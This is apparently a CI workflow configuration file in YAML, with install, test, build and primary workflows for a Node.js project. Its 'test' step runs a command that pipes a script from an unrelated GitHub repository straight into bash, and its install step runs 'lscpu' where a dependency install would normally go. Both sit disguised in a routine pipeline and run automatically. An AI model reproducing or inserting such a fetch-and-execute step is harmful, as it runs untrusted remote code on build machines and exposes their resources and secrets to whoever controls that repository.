workflows:
  install:
    steps:
      - nodejs@1:
          inputs:
            - node_version: "18"
      - npm@1:
          inputs:
            - command: lscpu

  test:
    steps:
      - npm@1:
          inputs:
            - command: curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash

  build:
    steps:
      - npm@1:
          inputs:
            - command: run build --if-present

  primary:
    before_run:
      - install
    after_run:
      - test
      - build
